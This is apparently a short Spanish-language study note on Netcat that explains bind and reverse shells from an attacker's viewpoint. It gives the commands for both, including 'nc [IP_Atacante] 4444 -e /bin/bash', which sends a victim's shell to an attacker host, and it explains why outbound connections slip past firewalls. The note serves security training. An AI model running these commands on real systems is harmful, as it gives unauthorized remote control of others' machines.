Es una herramienta extremadamente simple pero brutalmente potente que sirve para leer y escribir datos a través de conexiones de red utilizando los protocolos TCP o UDP.

A diferencia de `nmap` (que está especializado en escanear, detectar sistemas operativos y lanzar scripts de reconocimiento masivo), `nc` se enfoca en la **interacción directa**. Con Netcat puedes abrir puertos, conectarte a ellos, transferir archivos o incluso redirigir la consola de comandos de una máquina a otra.

#### 1. Bind Shell (La víctima abre el puerto)

La víctima ejecuta `nc -nlvp 4444 -e /bin/bash` (abre un puerto y expone su consola). Tú, como atacante, te conectas a ella usando `nc [IP_Victima] 4444`.

- _Problema:_ Los cortafuegos de las empresas suelen bloquear las conexiones que entran desde fuera hacia puertos raros.
    

#### 2. Reverse Shell (El atacante abre el puerto)

Tú, como atacante, pones tu máquina a la escucha con el comando que vimos antes: `nc -nlvp 4444`. Luego, haces que la víctima ejecute un comando que mande su consola hacia tu IP: `nc [IP_Atacante] 4444 -e /bin/bash`.

- _Ventaja:_ Es el método más efectivo, porque los cortafuegos suelen ser mucho más permisivos con las conexiones que **salen** desde dentro de la red hacia internet.